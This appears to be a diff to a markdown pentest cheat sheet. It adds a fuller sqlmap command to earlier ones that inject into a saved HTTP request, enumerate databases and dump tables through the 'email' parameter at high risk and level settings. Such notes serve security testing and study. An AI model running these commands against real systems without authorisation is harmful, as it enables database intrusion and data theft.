@@ -20,6 +20,9 @@ sqlmap -r request.txt --dbs
 # Attack the database you want
 
 sqlmap -r request.txt -D <TABLE_NAME> --tables --dump
+
+# a more complete command
+sqlmap -r request.txt -p 'email' --dbms=mysql --level=3 --risk=3 --batch --technique=BUT --dbs --dump --threads 3
 ```
 
 ---
